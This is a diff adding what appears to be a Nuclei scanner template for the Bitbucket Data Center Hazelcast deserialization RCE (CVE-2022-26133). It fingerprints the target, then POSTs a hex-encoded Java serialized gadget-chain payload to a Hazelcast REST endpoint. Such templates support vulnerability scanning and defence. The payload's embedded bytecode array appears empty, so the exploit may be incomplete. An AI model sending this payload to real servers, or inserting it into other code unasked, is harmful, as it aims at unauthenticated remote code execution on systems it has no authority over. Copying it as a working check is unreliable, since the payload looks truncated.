@@ -1,0 +1,46 @@
+id: cve-2022-26133
+info:
+  name: Bitbucket Data Center Hazelcast API Unauthenticated RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Atlassian Bitbucket Data Center contains a deserialization vulnerability in the Hazelcast interface, leading to unauthenticated remote code execution.
+  reference:
+    - https://github.com/snowyyowl/writeups/tree/main/CVE-2022-26133
+
+variables:
+  payload: "aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b7870000000027372002b6f72672e6170616368652e636f6d6d6f6e732e6265616e7574696c732e4265616e436f6d70617261746f72e3a188ea7322a4480200024c000a636f6d70617261746f7271007e00014c000870726f70657274797400124c6a6176612f6c616e672f537472696e673b78707372003f6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e636f6d70617261746f72732e436f6d70617261626c65436f6d70617261746f72fbf49925b86eb13702000078707400106f757470757450726f706572746965737704000000037372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00044c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000002757200025b42acf317f8060854e002000078700000"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{BaseURL}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "com.atlassian.plugins.atlassian-plugins-webresource-plugin:context-path.context-path"
+
+  - raw:
+      - |
+        POST /hazelcast/rest/maps/testMap HTTP/1.1
+        Host: {{BaseURL}}
+        Content-Type: application/octet-stream
+
+        {{payload}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "hazelcastInstance"
+        part: body
+      - type: word
+        words:
+          - "java.util.HashMap"
+        part: body
